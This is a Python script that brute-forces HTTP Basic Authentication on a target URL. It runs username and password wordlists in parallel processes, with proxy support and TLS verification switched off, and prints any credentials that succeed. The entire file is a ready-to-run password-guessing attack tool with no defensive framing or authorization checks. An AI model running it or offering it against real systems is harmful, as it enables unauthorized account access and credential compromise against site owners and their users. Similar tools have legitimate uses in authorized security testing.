import requests
from requests.auth import HTTPBasicAuth
from requests.adapters import HTTPAdapter, Retry
from multiprocessing import Pool, Manager, cpu_count
import argparse
import sys
import os
import urllib3
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def safe_lines(filepath):
    warned = False
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    line.encode('latin1')
                    yield line
                except UnicodeEncodeError:
                    if not warned:
                        print(Fore.YELLOW + f"[!] Skipping unsupported lines in '{filepath}' (non-latin1).")
                        warned = True
    except FileNotFoundError:
        print(Fore.RED + f"[!] File Not Found: {filepath}")
        sys.exit(1)

def create_session(proxy=None):
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session

def update_progress(current, total):
    bar_len = 40
    filled_len = int(bar_len * current / total)
    bar = '■' * filled_len + '·' * (bar_len - filled_len)
    percent = (current / total) * 100
    print(Fore.CYAN + f"\r[+] Progress: [{bar}] {percent:5.1f}%  →  ({current}/{total})", end='', flush=True)

def try_login(domain, username, password, proxy, shared, lock):
    if shared['found']:
        return
    session = create_session(proxy)

    try:
        response = session.get(domain, auth=HTTPBasicAuth(username, password), timeout=5)
    except requests.RequestException as e:
        print(Fore.RED + f"\n[!] ERROR: {username}:{password} → {e}")
        return

    with lock:
        shared['count'] += 1
        update_progress(shared['count'], shared['total'])

        if response.status_code == 200 and not shared['found']:
            print(Fore.GREEN + f"\n[✓] SUCCESS: {username}:{password}")
            shared['found'] = True
        elif response.status_code == 401:
            pass
        else:
            print(Fore.YELLOW + f"\n[?] UNKNOWN: {username}:{password} → Status: {response.status_code}")

def brute_force(domain, usernames, passfile, proxy, workers):
    print(Fore.BLUE + f"[+] Target: {domain}")
    print(Fore.BLUE + f"[+] Proxy: {proxy}" if proxy else Fore.BLUE + "[+] No proxy")
    print(Fore.BLUE + f"[*] Using {workers} Workers")

    manager = Manager()
    shared = manager.dict(found=False, count=0, total=0)
    lock = manager.Lock()
    tasks = []

    for username in usernames:
        for password in safe_lines(passfile):
            shared['total'] += 1
            tasks.append((domain, username, password, proxy, shared, lock))

    with Pool(processes=workers) as pool:
        pool.starmap(try_login, tasks)

    print(Fore.GREEN + "\n[*] Brute-force finished.")

def resolve_protocol(domain, username, password, proxy):
    http_domain = domain.replace("https://", "http://")
    https_domain = domain.replace("http://", "https://")
    session = create_session(proxy)

    try:
        response = session.get(http_domain, allow_redirects=True, auth=HTTPBasicAuth(username, password), timeout=5)
        if response.url.startswith("https://"):
            print(Fore.CYAN + "[+] Auto-redirect detected: using HTTPS")
            return https_domain
        elif response.status_code == 401:
            print(Fore.YELLOW + "[!] 401 Unauthorized on HTTPS, reverting to HTTP")
            return http_domain
        else:
            return http_domain
    except Exception as e:
        print(Fore.RED + f"[!] Error testing redirection: {e}")
        return domain

def main():
    parser = argparse.ArgumentParser(description="Multiprocessing Basic Auth Brute-Forcer with Progress Bar and Colors")
    parser.add_argument("-d", "--domain", required=True, help="Target URL (HTTP or HTTPS)")
    parser.add_argument("-U", "--userfile", help="Username wordlist file")
    parser.add_argument("-u", "--username", help="Single username")
    parser.add_argument("-P", "--passfile", required=True, help="Password wordlist file")
    parser.add_argument("-x", "--proxy", help="Proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("-w", "--workers", type=int, default=cpu_count(), help="Number of processes to use")

    args = parser.parse_args()

    if not args.username and not args.userfile:
        print(Fore.RED + "[!] Provide either -u or -U")
        parser.print_help()
        sys.exit(1)

    if not os.path.isfile(args.passfile):
        print(Fore.RED + f"[!] Invalid password file path: {args.passfile}")
        sys.exit(1)

    usernames = [args.username] if args.username else list(safe_lines(args.userfile))

    domain = resolve_protocol(args.domain, usernames[0], next(safe_lines(args.passfile)), args.proxy)
    brute_force(domain, usernames, args.passfile, args.proxy, args.workers)

if __name__ == "__main__":
    main()
